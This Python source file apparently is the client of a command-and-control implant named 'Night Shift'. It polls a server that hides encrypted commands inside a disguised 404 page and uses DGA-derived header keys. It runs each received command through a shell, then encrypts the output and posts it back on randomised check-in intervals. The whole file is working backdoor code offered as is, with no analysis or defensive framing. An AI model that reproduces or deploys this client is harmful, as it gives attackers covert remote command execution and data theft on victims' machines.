#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Night Shift Client
#
import aiohttp
import asyncio
import os
import sys
import time
import json
import subprocess
import base64
from random import randrange
from datetime import datetime
from subprocess import (PIPE, Popen)
from nightshift_dga import NightShift_DGA
from nightshift_cipher import NightShift_Cipher
from nightshift_collector import NightShift_Init_Check

class NightShift_Client():
    
    def run(self):
        try:
            ns_init_chkr = NightShift_Init_Check()
            ns_init_resp = ns_init_chkr.ns_init_check()
            ns_initchk_tf = ns_init_resp[0]
            ns_get_ua = ns_init_resp[1]
            ns_post_ua = ns_init_resp[2]
            ns_fof_url = ns_init_resp[3]
            ns_post_url = ns_init_resp[4]
            if ns_initchk_tf == True:
                pass
            else:
                print('Something is afoot and we cannot continue')
                sys.exit(1)
            loop = asyncio.get_event_loop()
            while True:
                try:
                    ns_fof_html = loop.run_until_complete(self.FourOFour(ns_get_ua,ns_fof_url))
                    ns_post_data = self.RunCommand(ns_fof_html)
                    ns_post_cmd = ns_post_data[0]
                    ns_post_slp = ns_post_data[1]
                    ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_cmd,ns_post_ua,ns_post_url))
                    if ns_post_slp >= 1:
                        ns_ss_sec = 60 * ns_post_slp
                    else:
                        ns_rand_num = randrange(1, 120)
                        ns_ss_sec = 60 * ns_rand_num
                    time_stamp = datetime.now()
                    print('[+] {0:s} --> Response from NightShif Server --> {1:s} NightShift Client next check-in in --> {2:s} seconds.'.format(str(time_stamp),ns_data_post_resp,str(ns_ss_sec)))
                except:
                    pass
                time.sleep(ns_ss_sec)
        except KeyboardInterrupt:
            print('\nInterrupted - NightShift Client exited due to a keyboard interrupt.') 
    
    async def FourOFour(self,ns_get_ua,ns_fof_url):

        async with aiohttp.ClientSession() as session:
            ns_url = ns_fof_url
            ns_get_key = NightShift_DGA()
            ns_get_cipher = NightShift_Cipher()
            ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
            ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
            ns_hdrs = {
                    'User-Agent': ns_get_ua,
                    'ETag': ns_hsh_key
                     }
            async with session.get(ns_url, headers=ns_hdrs) as response:
                ns_fof_html = await response.text()
            return ns_fof_html

    async def PostData(self,ns_post_data,ns_post_ua,ns_post_url):

        async with aiohttp.ClientSession() as session:
            ns_url = ns_post_url
            ns_get_key = NightShift_DGA()
            ns_get_cipher = NightShift_Cipher()
            ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
            ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
            ns_hdrs = {
                    'User-Agent': ns_post_ua,
                    'ETag': ns_hsh_key
                     }
            async with session.post(ns_url, headers=ns_hdrs, data=ns_post_data) as response:
                ns_post_resp = await response.text()
            return ns_post_resp

    def RunCommand(self,ns_fof_html):
        ns_get_cipher = NightShift_Cipher()
        ns_payload = ((ns_fof_html.split('HTMLDOC:'))[1].split('HTMLDOC')[0])
        ns_decrypt_payload = ns_get_cipher.decrypt(ns_payload)
        ns_json_payload = json.loads(ns_decrypt_payload)
        ns_host_fof = ns_json_payload['host_404']
        ns_host_os_fof = ns_json_payload['host_os_404']
        ns_host_os_cmd_fof = ns_json_payload['host_cmd_404']
        ns_host_slpstate_fof = ns_json_payload['host_slpstate_404']
        ns_init_json_path = 'ns_init_call.json'
        with open(ns_init_json_path) as ns_init_f:
            ns_init_data = json.load(ns_init_f)
            ns_host_hash = ns_init_data.get('host_hash')
            ns_host_data = ns_init_data.get('host_data')
            ns_host_os = ns_host_data.get('os_type')
            time_stamp = datetime.now()
        if (ns_host_os_fof == 'posix' and ns_host_os_fof == ns_host_os):
            output = subprocess.check_output(ns_host_os_cmd_fof, shell=True).decode('ascii')
            output_b64 = base64.b64encode(bytes(output, 'utf-8')).decode('ascii')
            ns_json_cmd_output = { 'time': str(time_stamp),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': output_b64 }
            ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
        else:
            ns_post_data = "wrong os type"
        return ns_post_data, ns_host_slpstate_fof

if __name__ == "__main__":
    NightShift_Client().run()
